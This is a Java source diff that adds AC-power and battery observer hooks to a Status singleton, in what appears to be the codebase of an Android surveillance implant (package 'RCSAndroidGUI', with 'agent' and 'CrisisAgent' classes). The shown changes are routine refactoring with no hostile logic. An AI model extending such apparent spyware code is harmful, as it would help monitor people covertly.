@@ -18,6 +18,7 @@ import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.CrisisAgent;
 import com.ht.RCSAndroidGUI.conf.Option;
 import com.ht.RCSAndroidGUI.event.EventConf;
+import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -58,6 +59,7 @@ public class Status {
 	private int crisisType;
 
 	private BatteryListener batteryListener;
+	private AcListener acListener;
 	
 	/**
 	 * Instantiates a new status.
@@ -69,6 +71,7 @@ public class Status {
 		optionsMap = new HashMap<Integer, Option>();
 		
 		batteryListener = new BatteryListener();
+		acListener = new AcListener();
 	}
 
 	/** The singleton. */
@@ -496,15 +499,19 @@ public class Status {
 		// TODO Auto-generated method stub
 	}
 	
-	public void batteryMonitor(Battery b) {
-		batteryListener.run(b);
-	}
-	
-	public void attachToBattery(Object o) {
+	public void attachToBattery(Observer<Battery> o) {
 		batteryListener.attach(o);
 	}
 	
-	public void detachFromBattery(Object o) {
+	public void detachFromBattery(Observer<Battery> o) {
 		batteryListener.detach(o);
+	}
+	
+	public void attachToAc(Observer<Ac> o) {
+		acListener.attach(o);
+	}
+	
+	public void detachFromAc(Observer<Ac> o) {
+		acListener.detach(o);
 	}
 }
